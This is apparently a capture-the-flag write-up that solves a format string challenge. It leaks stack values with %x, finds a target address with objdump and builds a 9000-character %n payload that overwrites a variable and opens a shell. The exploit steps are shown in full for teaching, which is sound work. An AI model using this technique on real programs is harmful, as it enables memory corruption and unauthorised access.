# 70 - Format

*Written by Michael Zhang and Sean Anderson*

## Problem

The function printf can do a lot of great things, but depends on how you use it. Try to exploit this very irresponsible use of printf.

Problem can be found at `/problems/format1` and source can be downloaded [here](format1.c).

## Hint

This line might interest you... `printf(argv[1]);`. What happens if no format arguments are provided?

## Solution

This program does not use printf correctly, using user input as a format string.  This allows the user to view and modify the stack of the program.  For example, to view some data on the stack, simply put a valid format string as the program's first argument:

```bash
$ ./format1 %x
1bc3be08$
```

At first glance, it seems that all printf can do is print data, however it can also write abitrary values using the `%n` format string.  From the man page:

>  The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is converted.

Therefore, all we need to do is write more than 9000 characters, and `vuln()` will execute.  To do this, we need to find out what pointer the program uses to refer to `key`.  First, lets load up get a disassembly with `objdump -d format1`

```
000000000040064e <main>:
  40064e:	55                   	push   %rbp
  40064f:	48 89 e5             	mov    %rsp,%rbp
  400652:	48 83 ec 20          	sub    $0x20,%rsp
  400656:	89 7d ec             	mov    %edi,-0x14(%rbp)
  400659:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  40065d:	48 c7 45 f8 50 10 60 	movq   $0x601050,-0x8(%rbp)
  400664:	00 
  400665:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  400669:	48 83 c0 08          	add    $0x8,%rax
  40066d:	48 8b 00             	mov    (%rax),%rax
  400670:	48 89 c7             	mov    %rax,%rdi
  400673:	b8 00 00 00 00       	mov    $0x0,%eax
  400678:	e8 63 fe ff ff       	callq  4004e0 <printf@plt>
  40067d:	8b 05 cd 09 20 00    	mov    0x2009cd(%rip),%eax        # 601050 <__TMC_END__>
  400683:	3d 28 23 00 00       	cmp    $0x2328,%eax
  400688:	7e 0a                	jle    400694 <main+0x46>
  40068a:	b8 00 00 00 00       	mov    $0x0,%eax
  40068f:	e8 82 ff ff ff       	callq  400616 <vuln>
  400694:	b8 00 00 00 00       	mov    $0x0,%eax
  400699:	c9                   	leaveq 
  40069a:	c3                   	retq   
  40069b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
```
   
  We can see that in `<main+15>`, `0x601050` is stored onto the stack as a local variable.  Next, lets see where on the stack the local variable is when we run printf:
  
```
$ ./format1 %x-%x-%x-%x-%x-%x-%x-%x-%x-%x
42d3038-42d3050-4006a0-e1bdce80-e1bdce80-42d3038-400520-42d3030-601050-4006a0$ 
```

We can see that the pointer `601050` is the 9th value on the stack.  (In the competition it was the 7th, but this is a different compile).  Based on this information, the input of the program should be

```
$ ./format1 garbagedata%x%x%x%x%x%x%x%x%n
```

It is very tedious to type out over 9000 characters of garbage, so we will create a file with this data.  

```
$ for i in `seq 1 9000`; do echo -n "x"; done > ~/xs.txt
$ echo "%x%x%x%x%x%x%x%x%n" | cat ~/xs.txt - > ~/arg.txt
```

Now that we have the garbage, all we have to do is feed it into the program and get the flag.

```
$ xargs -a ~/arg.txt ./format1
xxxxxxxxxxxxxxxxxxxxxxxx ... xxxxxxxx$ whoami
format1
$ cat flag.txt
theflag
$ exit
```
